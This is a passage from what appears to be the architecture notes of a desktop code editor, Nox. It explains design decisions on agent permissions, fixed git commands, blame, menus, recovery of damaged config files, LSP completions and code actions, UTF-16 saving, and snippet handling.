caller holding a live object could edit behind it. `tests/context.test.ts`
asserts the round trip, which a class instance would fail.

Reads are **recorded rather than gated**: context cannot leave the process by
itself, `net.request` is the capability that governs that and is declared by
every command that can reach the network, and prompting per read would mean a
dialog for every keystroke of an agent's thinking.
`context.reader(principal)` binds the caller once so the log cannot acquire
anonymous entries.

`workspaceTree` is built from the quick-open index rather than a fresh walk, so
it shows what `Mod P` shows and there is only one definition of "the project".

See [AGENT-PLATFORM.md](AGENT-PLATFORM.md) §2.5.

### Permissions are checked in exactly one place

`CommandRegistry.execute` takes a principal and consults a single guard before
running anything that declares a capability. That one check is sufficient
*because* of the rule the registry already enforces, that every action in Nox
is a command, so there is no second path for a plugin or an agent to take.

Commands declare `capabilities`, and `resourceFrom` to name what they are about
to act on, which is what lets a grant be scoped to a file rather than to the
whole disk.

**The user never reaches the check.** `execute` called without a principal,
which is every menu, keybinding and button, skips the guard, and
`PermissionService` short-circuits `{ kind: 'user' }` regardless. This is load-bearing, not an
optimisation: a model that can interrupt a human mid-keystroke is a model they
switch off, and a permission layer nobody runs protects nothing.

Denials **throw** `PermissionError` rather than returning false, because false
is what a disabled command returns and the two must not be confused.

See [AGENT-PLATFORM.md](AGENT-PLATFORM.md) §2.6.

### Jobs compute; the main path applies

`JobRunner` owns anything long-running: the project search walk, project
replace, and whatever comes next. The rule that makes cancellation safe is
structural rather than a matter of care: **a job never mutates a buffer.** It
returns a plan, and applying it happens after the job resolves, through
`workspace.apply` with the base revisions the job recorded while reading. So
cancelling is `discard`, with nothing to unwind.

Two consequences worth knowing before touching the file:

- **`result` settles the instant a job is cancelled**, not when its body
  returns. Cancellation is cooperative, so a body may be mid-`await`; the
  caller has already been told to ignore the value, and making it wait would
  spread one unresponsive job through everything downstream. The body runs on
  and its value is dropped.
- **`onCancel` runs immediately when cancellation has already happened.**
  Without that, cancelling while `searchProject` was still handing back its
  handle would never reach the Rust walker.

Jobs can carry a key; starting one cancels whatever was running under the same
key. That replaced a generation counter that `SearchService` checked by hand in
its batch callback.

### One view dispatcher per pane, not one for the app

`workspace.addViewDispatcher` keeps a *set*. Each pane registers one and
declines buffers it is not showing, so a programmatic edit reaches whichever
view is displaying its target.

This was a single slot until M2, and every pane overwrote it on mount: in a
split, only the last pane to mount could receive edits, and an edit aimed at the
other pane's buffer took the background path and left that view rendering text
that no longer matched the buffer.

### The document is canonical; the file's form is metadata

A buffer's document is always LF with no BOM. Line endings and the presence of
a byte-order mark are recorded on the buffer and reapplied on save (`decode` /
`encode` in `workspace.ts`). Every editing command, the search layer, dirty
comparison and project replace therefore see exactly one shape of text, and a
CRLF file does not produce a whole-file diff the moment it is saved.

### Git writes are six fixed commands, never a shell

Stage, commit, branch touches git through exactly six Rust commands (status,
branches, stage, unstage, commit, switch), each `git -C <root>` run with a
hand-picked, literal argv (`--literal-pathspecs`, `--` before every pathspec)
and no shell in the middle to reinterpret a `*` in a filename or a branch
name. **There is no generic seam that takes an arbitrary git subcommand or
flag.** A future capability means a new, equally fixed command, on purpose,
so the argv a feature runs is always the one `git.rs` shows, never one
assembled from parts a caller chose. The corollary a future reader would
otherwise undo: **a git failure is shown verbatim, never translated.**
`git_error` returns git's own stderr, or stdout where git prints "nothing to
commit" there instead, with an `io:` prefix and nothing rewritten, so
what the panel reports is what a terminal would have said.

The six were also chosen defensively, not for convenience. Unstage runs `git
reset -- <pathspec>`, not the more obviously-named `restore --staged`,
because the latter fails on a repository with no commits yet, right after
`git init`, with "could not resolve HEAD". Found by running both against a
real repo before picking one rather than by reading a man page. Pathspec-
limited `reset` handles that case cleanly and never touches the working
tree either way. Deliberately absent for the same reason the README leads
with "It does not lose your work. Ever.": no push, pull or fetch (nothing
leaves the machine), no rebase, amend or force (history is never rewritten),
no discard, stash or `checkout --` (the working tree is untouchable by
construction of the commands chosen: `switch` refuses over a dirty conflict
rather than forcing through it). Hunk-level staging is deliberately out of
this set too: it is the one place the feature would construct input for git
(`apply --cached`) rather than naming files, and it gets its own envelope
read when it is built.

### Blame asks git about the buffer, not the file

`nox_git_blame` passes the open document to `git blame --contents -` on
stdin, rather than letting git read the path off disk. The gutter draws
beside what is *open*; `git blame <path>` describes what is *saved*. The
moment those differ, on any unsaved insertion or deletion, blaming the saved
file misaligns every annotation below the first one, and a gutter naming the
wrong person is worse than no gutter. `--contents` is git's own answer:
it blames the text it is handed against the path's history and attributes
lines that are in no commit to the all-zero object name, so alignment is
exact by construction and "not committed yet" is a fact git computed rather
than one the renderer inferred. Verified against real git before it was
built, and pinned by
`an_unsaved_insertion_shifts_blame_instead_of_misattributing_it`.

Two consequences a future reader would otherwise undo. **`uncommitted` is
read off the hash, never the author.** git names that author
`Not Committed Yet` when it blames a dirty worktree and
`External file (--contents)` when it blames supplied text, which is how Nox
always asks, so keying on the name would work in a fixture and fail in the
product. And **the blame marks are one point per line, never one range per
commit-run**, even though blame arrives run-length encoded and ranges would
be a fraction of the marks: a range grows when text is inserted inside it, so
a line typed in the middle of a run would inherit that run's commit. A point
mark cannot do that: an inserted line simply has no mark.

A third thing about it was settled by looking rather than reasoning, and is
recorded because the reasoning had already reached the wrong answer.
`blameCompartment` is **first** in `buildExtensions`'s array, so the blame
column is leftmost, outside the line numbers. `activeGutters` is an ordered
facet, so a gutter's position on screen is its extension's position in that
array, and going last put the widest column in the editor between the git
gutter and the code: switching blame on then moved the change bars twenty
characters away from the lines they mark. Outside everything, it adds a column
instead of rearranging the apparatus a reader already knows. The same look
halved the dead space in it: `BLAME_AUTHOR_WIDTH` is 12, not the 16 it was
written as. Neither had a symptom any test reported, which is what
`tests/browser/blame-gutter.test.ts` and its screenshots now exist for.

### `nox_git_blame` is the crate's only `#[tauri::command(async)]`

A sync command body runs inline on the thread that handles the IPC message,
which is the main thread. Read in `tauri-macros` 2.6.3 rather than assumed:
the default `ExecutionContext::Blocking` emits `let result = $path(…)`
straight into the handler, while `(async)` routes it through
`respond_async_serialized`, which spawns. Every other git read here costs one
blob or one index scan; blame is the first whose cost follows a file's
*history*, and on an old file in a large repository that is seconds. The
function stays `pub fn`, because there is nothing to await and nothing to
cancel, so the reason the rest of the crate avoids `async fn` (a cancel handle
that
arrives only once there is nothing left to cancel) does not apply.

The same reading says the git reads that came before it, `nox_git_file_base`
and `nox_git_status`, do block the main thread for as long as they run. That
is recorded in the Known debt table rather than changed here.

### Where the OS will not draw a menu, Nox draws its own

macOS has a native menu bar and keeps it. Everywhere else (Windows, Linux and
the browser target) `MenuBar.svelte` renders one inside the title bar.
Windows is the reason: `set_decorations(false)` there removes the frame
Windows hosts its menu in. Linux is not blocked by that (the `#[cfg(windows)]`
block is Windows-only) but by the accelerator argument below being WKWebView's
and never tested against WebKitGTK. One in-window bar for both is cheaper
than a third code path with an unverified story.

It is gated on `capabilities.applicationMenu`, so macOS is untouched and no
`Platform` method or IPC is added. Both menus render `MenuService.describe()`,
so drift is structurally impossible. There is no second layout table.
`buildMenu` takes `{ systemItems }` for the difference that is real:
`COVERED_BY_SYSTEM_ITEMS` is not a list of commands a menu should never show,
it is a list of commands *macOS already shows*, so off macOS they are listed
as ordinary commands and nothing `predefined` is emitted at all.

**The payoff is `enabled`.** The native menu draws every item live because
greying them would mean pushing ~130 command states across the IPC boundary.
The predicates already live in the renderer, so the in-window bar simply calls
them when a menu opens: once per item in the one submenu shown, no IPC,
nothing on the typing path.

The popup is `ContextMenu` unchanged: it already does arrows, Home/End,
type-ahead, Enter, Escape, focus return and viewport flipping, and a second
implementation of that would be a second set of bugs. `UIService` stays the
single authority on what Escape closes. The bar renders from `menuBarOpen`
rather than owning it, because when it owned its own state the two disagreed
and a menu stayed on screen that the app believed had closed.

### The native menu is generated from the command table

The menu is not written out anywhere. `services/menu.ts` reads
`CommandRegistry.all()` and groups it by `category` into the menus `LAYOUT`
names, and Rust (`src-tauri/src/menu.rs`) only turns that description into
real items. Two consequences, both deliberate.

**Nothing can be left out.** A hand-written menu would be a second list of
~140 titles with nothing keeping it in step with the first, and the failure
mode of that drift is precisely the one the menu exists to fix: a command
nobody can find. A category no `LAYOUT` entry claims gets its own trailing
menu rather than disappearing, so adding a command with a new category makes
the menu untidy, never incomplete. `tests/menu.test.ts` asserts the whole
palette-visible set appears exactly once.

**Accelerators cannot fire twice, and the reason is mechanical.** A native
accelerator and Nox's in-page keymap are two routes to one command, and a
single keypress must not take both. `KeymapService.attach` listens on `window`
in the **capture** phase and calls `preventDefault()` on every chord it claims,
whatever has focus; WKWebView's `performKeyEquivalent:` forwards a key
equivalent to the page and re-dispatches it to the main menu *only* when the
page did not consume it. Consumed-by-the-page and delivered-to-the-menu are the
two halves of one branch, never both. The recorded desktop run at
`.desktop-pass-report.md:38` is the observation that matches: ⌘W sits on both
`PredefinedMenuItem::close_window` and `file.close`, and it closed the file.

That argument only covers chords *the page* claims, which is why an accelerator
is attached **only where `KeymapService.chordFor` reports an application
binding**. Three groups are handled differently, each for a stated reason:

| Group | Treatment | Why |
|---|---|---|
| Application keymap (⌘S, ⇧⌘P, …) | Real accelerator | Captured on `window`, so the page always consumes it first |
| CodeMirror-owned (`keyHint`: ⌘⇧K, ⌥↓, …) | Menu entry, no chord shown | CodeMirror only prevents default while the editor has focus; an accelerator would delete an editor line from inside the search field |
| Undo/Redo/Cut/Copy/Paste/Select All | `PredefinedMenuItem`, no Nox command listed | They go through the responder chain and act on whatever has focus, which a command dispatched at the editor cannot |

The one case where an accelerator *is* reached by a keypress is a command the
keymap declined because it is **disabled**, and the menu item dispatches
through `CommandRegistry.execute`, which refuses a disabled command anyway. So
the menu can never run something the keyboard would not. Menu items are
nonetheless always drawn enabled; mirroring ~130 enablement predicates across
the IPC boundary on every state change is not worth it, and is recorded as debt.

### The window is remembered in Rust, beside the session

Window size and position persist to `window.json` in the app config directory,
written by `src-tauri/src/window_state.rs` and restored through the same
`apply_geometry` that `--geometry` uses, so there is exactly one clamp
(`geometry::clamp`), and a window remembered on a monitor that is no longer
attached comes back on screen rather than off it.

**Rust rather than a service**, against the usual pull of the `Platform` rule,
because the *restore* has to land before the webview exists or the window
visibly jumps after first paint; Rust already owns the window, already resolves
the config directory, and is where the flag this must lose to is parsed.

**Its own file rather than `session.json`**, for three independently sufficient
reasons: `session.json` is only read when `workbench.restoreSession` is on, and
forgetting your window because you turned off tab restore is nobody's
expectation; `SessionService.clear()` blanks that file, and clearing tabs should
not move the window; and Rust would have to understand a versioned, migrated
renderer schema to read four numbers out of it.

Three rules the implementation turns on, each with a test in `geometry.rs`:
`--geometry` **wins and records nothing** (the flag is a walk affordance; a
harness-sized window must not overwrite the user's); a fullscreen or maximised
window is **never stored as a size**, or one ⌃⌘F makes every later launch
screen-sized; and writes are **debounced 400 ms** on the trailing edge, so a
drag-resize costs one write rather than one per frame. Coordinates are stored
work-area-relative, which is the space `clamp` works in and what makes
"the same place on whatever display it opens on" the degraded behaviour.

Nothing is written for the first second after launch: `set_position` is
asynchronous on macOS, so a read-back taken that early reports where the window
*used to be*. Since that is usually the centred default, the remembered
position would creep back to centre one launch at a time.

### Long panels are windowed, and each publishes its own row height

The explorer and the search results both render flat, uniform-height row
arrays that can run to thousands of entries. 5000 matches is `MAX_RESULTS`,
and a directory has no bound at all. Both window: a `viewportHeight > 0` guard
(so jsdom, which has no layout, still renders everything and tests stay
meaningful), a `MIN_ROWS_TO_WINDOW` floor so short lists pay nothing, spacer
divs preserving scrollbar length, and `aria-setsize`/`aria-posinset` on every
row, mandatory rather than decorative, because the DOM no longer holds the
full set for a screen reader to count.

Scroll-into-view is **index arithmetic**, not `scrollIntoView` on a
`.focused` element. The focused row can legitimately be outside the rendered
window, at which point there is no element to scroll to; a reveal built on the
DOM silently stops working exactly when the list is long enough to need it.

Each panel publishes its row height as its **own** custom property:
`--nox-tree-row-h` at 23px and `--nox-search-row-h` at 22px, each read back by
that panel's CSS. One shared name was the obvious simplification and is wrong: the
two heights differ, and a single inherited property would silently paint one
list at the other's pitch while the arithmetic used the correct one. The rule
is that the number the arithmetic uses and the number the CSS paints must be
the same token, not that all panels share a token.

---

### A config file that will not parse is damaged, not absent

Four load paths (`settings.json`, `keybindings.json`, `session.json` and
`notes.json`) treated a file they could not parse as a file that was not
there. Absent is a state Nox already handles: start from the defaults and
write your own file over the top. That is correct for a file that genuinely
is not there and destructive for one that is, and every one of these four is
written back by Nox. The next `set()`, the next rebind, the next save
replaced the user's file with a fresh one, silently.

`servers.json` and `agents.json` had always done the right thing: publish the
parse error and say so. Neither is ever written back by Nox, which is why the
asymmetry survived: the two paths where reporting was merely *polite* had it,
and the four where it was the only thing standing between a typo and a loss
did not.

A damaged file is now **preserved, reported, and read for what survives**:

- **Preserved** as `<name>.damaged.<ext>` beside the original, through
  `core/damaged-config.ts`. The original is *not* deleted, because Nox does
  not delete a user's file to fix its own problem, and it being overwritten by
  the next legitimate write is acceptable precisely because the copy exists.
- **Reported** on a `damaged` signal that is deliberately **not** `error`.
  `error` means "the last *write* failed" and `ConfigService.#save` clears it
  on the next write that lands, which would erase a damage notice about
  250 ms after it appeared.
- **Read for what survives.** `session.json` and `notes.json` both hand out
  content-file names (`unsaved-3.txt`, `note-7.txt`) from a counter that is
  "recomputed on load", so a load that fails reissues `unsaved-1.txt` and the
  first dirty buffer overwrites text the user never saved. `JSON.parse`
  failing does not make the text unreadable, it makes it *unstructured*, and
  the names are still in it. `highestNumbered` recovers the high-water mark
  from a truncated file exactly as it would from a valid one. That is the
  whole of the salvage, deliberately: one number is all it takes to stop the
  next write landing on a file that still holds the user's text.

An unrecognised **version** counts as damage on the same reasoning. It is
usually a newer Nox having written the file rather than corruption, but the
old consequence was identical, discarded and then overwritten, and a downgrade
should not cost you your tabs. Versions Nox does recognise still migrate.
### A pane routes changes back, so the workspace must deliver them once

`#dispatchToView` handed a workspace-originated change to **every** pane
showing the file. That was written to fix a real failure, one pane updated and
the other left showing text that no longer exists, and it was correct at the
time. Mirrored panes then arrived, and with them the forward in
`applyTransaction`: a pane routes everything it is handed back to the
workspace, which pushes the change out to every *other* pane. From that moment
the broadcast was a **second** delivery, and the second one arrives at a
document that has already moved.

The cost was not cosmetic. A reload's spec is
`{from: 0, to: oldLength, insert: newDoc}`, so a file that had grown came back
as the new text with a slice of itself appended, and `reloadFromDisk` sets
`savedDoc` from the resulting state, which marked the corrupted document
**clean**. The next save wrote it to disk. A file that had shrunk threw
`RangeError` out of the reload instead. Every path that pushes a change into a
view (reload, `applyEdits` for project replace, `apply` for agent and LSP
change sets, grouped undo) went through it.

The two directions are now two methods, because they want opposite rules:

- **`#dispatchToView`** stops at the first pane that accepts. That pane's route
  back mirrors the change to the others, so one delivery still reaches all of
  them. A buffer no pane is showing falls through to the background path
  exactly as before.
- **`#mirrorToOtherViews`** broadcasts, and is safe as one because its spec
  carries `mirroredAnnotation`: a pane applies it and stops rather than
  routing it back, so nothing re-enters and nothing can arrive twice. It has
  to broadcast: with three panes on one file, stopping at the first would
  leave the third stale.

**The test that missed this is the lesson.** `groups.test.ts` asserted the
broadcast with two stubs that recorded what they were handed and never called
`applyTransaction`. A dispatcher that does not route back is not a pane, and
every defect in this feature lives in the loop between the two. The fakes are
re-entrant now, and `tests/pane-fidelity.test.ts` models a pane with a real
`EditorState`.

Three more of the same family, all found by asking what the existing pane
tests were *not* shaped to see:

- **`selectionOf` asked a pane for "your cursor"**, and a view's live selection
  is its active tab's, so every background tab in every pane was persisted
  with the foreground tab's. The channel is now asked about a named buffer and
  declines for one it is not showing, which lets the caller fall back to that
  buffer's own state. The old tests gave each group one tab, where the two
  answers coincide.
- **Session restore called `splitEditor()`**, which *moves* the active tab when
  its group holds more than one. A first pane with two tabs therefore came back
  with the second of them relocated, every launch. Restore wants an empty pane,
  and now says so: `splitEditor({ move: false })`.
- **No production caller passed a group to `workspace.close`.** The parameter
  existed and its tests drove it directly, so `#groupOf` fell back to "the first
  group showing this buffer" and ⌘W in the second pane of a mirrored file closed
  the first pane instead. `TabBar` knew its `groupId` all along. `Close All
  Files` had the same root: it iterated the deduplicated `buffers` list, so a
  mirrored file was closed once and survived in the other pane.
### Registering the handler is what advertises the capability

`JsonRpcTransport.onRequest` was written with the client and had **no caller in
`src/` for four months**. Every question a server asked was answered
`MethodNotFound`, which is the correct answer, and is exactly why nobody
noticed. A server told "I do not know that method" does not stall. It does
without. pyright, gopls and rust-analyzer all ask `workspace/configuration` as
they start, and all three silently used their own defaults instead of the
user's settings.

The seam now lives on `LspSession` rather than the transport, for the reason
`onNotification` already did and one more. `onNotification`'s reason is that
diagnostics arrive unasked and a subscriber that waited for the handshake would
miss the first batch. The stronger reason here is that **a server may ask
during the handshake**, since one of the three asks before `initialized` goes
out, so a handler registered after `start()` returns arrives to find the
question
already refused.

The part worth arguing for is smaller and less obvious. `initialize` carries
the client's capabilities, and the block has always been written by hand under
a comment saying *"Nox advertises what it implements and nothing else."* That
comment is a rule a person has to remember, and it can fail in both directions:
a capability claimed with no handler is **worse than not claiming it**, because
the server stops looking for those settings anywhere else; a handler with no
capability is never asked at all.

So the capability is *derived* from the handler map at `start()`, not written
beside it. `workspace.configuration` appears in `initialize` if and only if
something registered a `workspace/configuration` handler. The rule stops being
a comment and becomes the code. `tests/lsp-session.test.ts` pins both halves,
and the mutation that advertises unconditionally fails it.

`window.workDoneProgress` follows the same derivation, and its gate is worth
naming because it is not the obvious one: it hangs on the
`window/workDoneProgress/create` **request** handler, not on anything about
`$/progress`. Server-initiated progress *starts* with the server asking to
reserve a token, so a client that cannot answer that never receives a
notification either, however well it would have handled one.

**`settings` is a separate field from `initializationOptions`, and the
distinction is not cosmetic.** The latter is pushed once, unasked, before the
server can do anything, and is where a server wants what it needs to start. The
former is *pulled*, whenever the server likes and as often as it likes, and is
where the user's ordinary options live. Servers that want both want different
things in each, so folding them together would make one of the two wrong.
Neither is validated: what counts as a valid setting is the server's question,
and a client that rejected what it did not recognise would break every server
the moment one added an option.

The reply is a `map` over the requested items and never a `filter`, because a
server reads `result[i]` as the answer to `items[i]`. Dropping an unknown
section shifts every later answer onto the wrong question, a bug that
presents as the user having misconfigured a setting they never touched.

### A code action lands where it reaches, not where it is classified

The eighth `textDocument/*` feature, and the one the others were leading to:
seven of them tell you about your code and this is the one that changes it.

**Where an action lands is the decision.** The codebase already splits this
two ways and both ends are argued for: rename stages in the review panel
because it is a refactor across files you are not looking at, and Format
Document applies directly, "not through review, because a format is not a
proposal". A code action is sometimes one and sometimes the other.

The line is **not** the server's `kind`. Servers disagree about whether
something is a `quickfix` or a `refactor`, and a client that branched on it
would inherit that disagreement. The line is how far the change reaches:

> One file: applied directly, as one transaction. More than one: staged.

A change inside the file you are looking at, that you asked for at your caret,
is not a proposal, and putting it behind a diff would make Format Document's
argument apply to it and be ignored. A change to files you have not opened is
exactly what review is for, and it is the shape rename already produces.

**An action may be a `Command` rather than an edit, and both now run.** Running
a command means `workspace/executeCommand`, and the server answers by calling
`workspace/applyEdit` *back*, so it needed the server-request seam
(`LspSession.onRequest`, 2026-08-25) and a decision: may a server-named command
write to buffers unprompted?

**The decision is that reach answers it, not trust**, which is the same rule
this section already argues for. A server command that changes the file at your
caret lands directly; one that reaches further stages in review. The
alternative would have been a second policy for the same act, a server writing
to a file, differing only in which message carried the edit, and two rules for
one thing is how one of them ends up wrong. `applyPlanByReach` is shared by
both paths so they cannot drift.

An action may also carry *both*, and the order is not ours to choose: the
specification says the edit is applied first and the command run after. A
failed edit stops the command, because running the second half of an action
whose first half did not land is the partial application this whole rule
exists to avoid.

Three smaller things worth keeping:

- **`context.diagnostics` is load-bearing, not decoration.** It is what a
  server keys its quick fixes off; send none and tsserver answers with
  refactors only, so "no quick fix here" would be Nox's fault rather than the
  server's. `overlapping` picks the ones the range touches, edges included:
  a caret resting on the end of a squiggle is still on it.
- **`codeActionLiteralSupport` has to be advertised** or a server is entitled
  to answer with the pre-3.8 bare `Command` shape, which is precisely the half
  Nox cannot run. `resolveSupport` and `dataSupport` stay unclaimed, so a
  server must send complete actions rather than stubs.
- **The request reads the workspace, not the view.** `buffer.state` is the
  authoritative copy, because a pane routes every transaction back into it,
  so this feature needs no `EditorView` and is drivable under Node, which is why it
  has app-level tests where rename beside it has none.

`workspaceEditPlan` moved out of `lsp-rename.ts` on the way: one reader, two
callers, and a `WorkspaceEdit` is not a rename concept.

---

### The server names the start; the editor keeps the end

`toCodeMirrorCompletions` has read `textEdit.range` into `from`/`to` since it
was written. "Believed over any range the client would guess", says its
comment, and "ignoring it is how `console.log` becomes `console.console.log`",
says its test. **Nothing read the result.** The source inserted at the
list-level `from`, the start of whatever CodeMirror's own `[\w$]+` matched,
and the two only *usually* agree. They part company wherever the server wants
to rewrite more than the last word, such as a path inside a string or a member
expression, and accepting left the rest of the range sitting in front of the
insertion, which is the failure that comment describes.

Third of the same shape found in as many days, after the `skip` set on
`computeReplacements` and `additionalTextEdits`: a value converted carefully,
tested at the conversion, and never consumed. The conversion being covered is
what makes it invisible. The test passes, and it is testing a function whose
output goes nowhere.

**The start is applied and the end is not**, and that split is the whole
decision:

- The **start** is the half the server knows better and the half that does not
  drift: everything typed while the list filters locally is at the caret, and
  the caret is after it.
- The **end** is the half that cannot survive that. A range may also end
  *after* the caret, meaning "replace the whole word I am standing in the
  middle of". That is replace mode, gated in LSP behind `insertReplaceSupport`,
  a capability `session.ts` does not advertise on the stated principle that Nox
  claims nothing it does not implement. Insert mode is also every editor's
  default. So `to` stays CodeMirror's, which maps with assoc 1 and therefore
  follows the caret.

The staleness test is not a heuristic. The range is in the coordinates of the
document the completion was *requested* against, and CodeMirror hands `apply`
a `from` it has mapped forward through every change since
(`ActiveResult.updateFor`). Keeping the request-time value of that same
position makes `from === requestFrom` an exact test for "nothing before the
completion has moved". When something has, the editor's own mapping is the
answer and the server's raw offset is not.

One latent crash went with it. `InsertReplaceEdit` is `{ newText, insert,
replace }` with **no `range`**, and `item.textEdit.range.start` threw a
`TypeError` out of the completion source, which kills completions for that
server and says nothing at all. The range is validated with `isLspRange` now,
the same predicate rename and formatting read their edits through.

---

### An auto-import is a second edit, and it arrives late

`additionalTextEdits` is how the protocol says "and also make these other
changes": the import an auto-import completion needs. `LspCompletionItem` had
no such field, so accepting `readFileSync` inserted the symbol and dropped the
import the server had already computed. Silent wrong output, not a missing
feature: the completion appears to work and produces code that does not
compile.

Two server shapes had to work, and only one of them can be atomic. Some
servers send the edits in the completion list; **tsserver sends them only on
`completionItem/resolve`**, which is a round trip that happens after the user
has already pressed Enter.

`CONTRIBUTING.md:65-69` decides the shape, with format-on-save as the
precedent: *"the save always happens… a late answer is dropped, a keystroke
during the request wins"*. So the completion is inserted **synchronously,
always**: accepting one never gets slower than it was, whatever the server is
doing. The import goes in the same transaction when the edits are already
known, and in a second one when they are not.

**The tooltip is what makes the atomic path the common one.** `info` was
already a lazy resolve, and CodeMirror calls it when an item is *highlighted*:
before Enter for a keyboard user, and always for a tsserver item, because
those carry no documentation in the list. Caching that resolved item and
reading it from `apply` is the whole reason the asynchronous path is rare
enough to accept, rather than a bolt-on optimisation.

**Offsets are request-time coordinates, and they are checked rather than
trusted.** The list is filtered locally while the user keeps typing
(`validFor`), so no new request is made and the offsets go stale by however
many characters were typed at the cursor, all of them *after* an import at
the top of the file. So the guard is a prefix compare: the current document
and the request-time document must still agree on everything up to the last
position the edits touch. If they do, the offsets mean what they said; if they
do not, the edits are **dropped rather than written at a position that now
means something else**, which is the call `undoLastReplace` and rename already
make.

The conversion is `changesOf` from `core/lsp-text-edit.ts`, which rename and
formatting already share: one reading of `TextEdit`, one conversion.

---

### UTF-16 is the one charset `encoding_rs` will not write

`encode` delegated every non-UTF-8 charset to `encoding_rs`, which is right
for windows-1252 and Shift_JIS and silently wrong for UTF-16. The crate
implements the WHATWG Encoding Standard, and in that standard **UTF-16 is
decode-only**: `UTF_16LE.encode` uses `output_encoding()`, which is UTF-8, and
reports no unmappable characters while doing it.

So the call returned `Ok`, the atomic write succeeded, the status bar went on
saying "UTF-16 LE", and the file on disk was UTF-8. A PowerShell script or a
`.reg` file opened in Nox stopped being UTF-16 the first time it was saved.
The only signal was the tuple's second item, the encoding actually used, and
the code discarded it with `let (bytes, _, had_unmappable)`.

Nothing in the type system or the return value distinguishes this from a
successful save, which is why it survived a feature that shipped with tests:
`round_trips_windows_1252` covers the charset where delegation works, and
there was no encode test for the charset where it does not.

UTF-16 is now encoded here rather than delegated: `str::encode_utf16`, then
each unit in the requested byte order. That is total, unlike the legacy
charsets: every `str` is valid Unicode and every scalar value has a UTF-16
form, so there is no `unmappable` case for this branch to refuse, and an
astral character becomes a surrogate pair rather than one lost unit.

**The byte-order mark is always written**, and that is the load-bearing half.
`detect` recognises UTF-16 only by its mark, and mark-less bytes are worse
than undetectable: little-endian ASCII is `h\0i\0`, which `std::str::from_utf8`
accepts, since NUL is valid UTF-8, so the file would be detected as UTF-8 and
then refused by `looksBinary` for containing NULs. Writing the mark is what makes a
file Nox wrote a file Nox can open, and the round-trip test asserts exactly
that property rather than only the bytes.

The test vectors are not hand-written. They come from Python's `codecs`, and
the encoder was checked against it over 4020 strings including astral
characters before any of them was committed. An independent implementation
rather than the module agreeing with itself.

---

### An excluded match is an identity, never an index

Project replace could exclude a whole *file* and nothing smaller, which is the
wrong granularity for the case people hit: forty matches, thirty-eight wanted,
two in a fixture or a comment that means something else.

`computeReplacements` has taken a `skip` set of match indices since it was
written, documented as walking "in exactly the order `findMatches` does", and
**no caller ever passed one**. The primitive was right; what was missing was
the state in between, and one decision.

The decision is that an exclusion cannot be stored as an index.
`#replacePaths` deliberately does not trust the stored result rows. It
re-reads the file and recomputes, because a file edited since the search would
otherwise be rewritten from stale coordinates, and because the replace source
prefers an open buffer while the *results* came from disk. So index 3 of the
results and index 3 of the text being replaced are the same match only while
nothing has moved.

An exclusion is therefore `path`, 1-based `line`, and the **absolute** column,
`previewOffset + column`, because a long line's preview is a window into it and
two matches on one long line would otherwise key the same. At replace time the
current text is walked with `findMatches`, the same loop `computeReplacements`
runs, and the skip indices are positions in *that* walk. Nothing carries over
from the search but the identity.

**When an identity cannot be found, the file is refused rather than replaced.**
If the excluded match is no longer at the line and column it was excluded at,
Nox does not know which text the user meant to protect, and replacing the rest
would be replacing something they said not to. It joins `failed`, which the
toast already reports, and the file stays in the results. Same rule rename uses
for a file edited during review, and the same rule `undoLastReplace` uses for a
file that no longer says what the replace left there: when the world has moved,
refuse rather than guess.

Replacing exactly one match is that machinery with the set inverted, every
index except this one, which is why it costs a method rather than a mechanism
and why it inherits the refusal for free.

The panel's counts needed no arithmetic of their own: `dismissMatch` removes
the row from `results`, and `pendingReplaceCount` and the file-row badge read
`results` and nothing else. The dismissed set exists only to become skip
indices; it is never a second source of truth about what is on screen.

---

### A fake that emits one shape of a record proves less than its test count

Real `git status --porcelain=v2` collapses an untracked directory into a
single `? lib/` record and never names the files inside it. `MemoryPlatform`
only ever emitted `? <file>`, so twelve component tests and ten mutation
checks all passed while a brand-new folder carried no marker at all. A walk of
the packaged app found it; nothing else could have.

Auditing the other fakes for the same property found five more of the same
kind, and the pattern is worth stating as a rule: **when a fake can only
produce one shape of a record, every test over it is exercising the easy
path.** The question to ask of any fake is not "does it return the right
facts" but "does it return them in every shape the real thing sends".

What that audit turned up, all since fixed: `git show :0:` fails on an
unmerged path (the fake wrote a stage-0 entry that real git does not have, so
a conflicted file silently lost its gutter); `ignore`'s walker defaults to
skipping hidden files, so dotfiles were unsearchable while the fake walked
them. `ignore`'s overrides are last-match-wins, so excludes added before
includes were inert, and the test asserting otherwise encoded the *fake's*
behaviour. `BufRead::lines()` ends a stream on one invalid byte, which the
fake could not represent because it deals in JS strings.

The same reasoning applies to test *helpers*. `search_integration.rs` re-types
the walker configuration rather than importing it, which is why it certified
both search defects as absent. A copy of the logic under test is not a test.

---

---

## 5. How to add a feature

1. **Model it in a service.** No logic in components.
2. **Expose state as a `Signal`.** Components subscribe with `$signal`.
3. **Register a command** in `app.ts#registerCommands`. Give it a category and
   keywords. It appears in the palette automatically.
4. **Bind a key** in `#registerKeybindings` if it deserves one. It appears in
   the shortcut reference automatically.
5. **Add a setting** to `config/schema.ts` if it is configurable. It appears in
   Settings automatically.
6. **Test the service** against `MemoryPlatform`.
7. **Then** write the component.

If a step feels like it needs an exception, that is a signal the feature is in
the wrong layer.

---

### Snippets: one lifecycle, two dialects, and a translation between them

Snippets arrived as one feature with two faces: the user's own, from
`snippets.json`, and the language server's, once `snippetSupport` is claimed in
the handshake. Only the *sources* differ; the expansion is CodeMirror's
`snippet()` in both cases, which is the whole reason building them together
cost barely more than building either.

**The dialects are not the same, and the difference is not cosmetic.**
CodeMirror's parser matches braced fields only (`${1}`, `${1:label}`) while
LSP's tab stops are bare: `$0`, `$1`. A server's template therefore expanded
its placeholders correctly and left `$0` sitting in the buffer as text.
`core/snippets.ts#toCodeMirrorTemplate` is the translation, and it does three
things and no more: braces a bare stop, reduces the protocol's
`${1|a,b|}` choice to `${1:a}` because there is no picker to offer the rest,
and unescapes `\$`. **Variables are deliberately untouched.** Nox substitutes
none of them, and `$TM_FILENAME` left visible is a thing the author can see and
fix; silently deleted, it is a thing they cannot.

**The capability and the handler landed together**, which is the rule
`lsp/session.ts` states about every claim it makes. `snippetSupport` was absent
before this not as an oversight but because claiming it invites a server to
send something Nox would have flattened.

**A snippet may have to travel with an auto-import**, and `snippet()` dispatches
for itself. Handing it a `dispatch` that captures is the only seam it offers,
and what it builds (changes, a selection over the first field, the effect that
installs the field keymap) is exactly a transaction spec. That effect is
load-bearing: it carries the `appendConfig` that arms the `Prec.highest` Tab
binding the first time a snippet runs in a buffer, so Tab moves between fields
without Nox owning a mode flag, and falls through to accept-completion and then
indent when no snippet is active.

